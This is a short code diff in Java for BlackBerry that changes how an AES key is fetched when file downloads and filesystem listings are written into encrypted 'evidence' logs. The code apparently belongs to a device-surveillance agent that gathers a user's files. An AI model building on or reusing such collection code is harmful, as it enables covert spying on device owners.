@@ -11,6 +11,7 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.Status;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -250,7 +251,7 @@ public abstract class Protocol {
 
         byte[] content = file.read();
         byte[] additional = Protocol.logDownloadAdditional(filename);
-        Evidence log = new Evidence(false, Keys.getInstance().getAesKey());
+        Evidence log = new Evidence(false, Encryption.getKeys().getAesKey());
         log.createEvidence(additional, EvidenceType.DOWNLOAD);
         log.writeEvidence(content);
         log.close();
@@ -295,7 +296,7 @@ public abstract class Protocol {
     }
 
     public static void saveFilesystem(int depth, String path) {
-        Evidence fsLog = new Evidence(false, Keys.getInstance().getAesKey());
+        Evidence fsLog = new Evidence(false, Encryption.getKeys().getAesKey());
         fsLog.createEvidence(null, EvidenceType.FILESYSTEM);
 
         // Expand path and create log
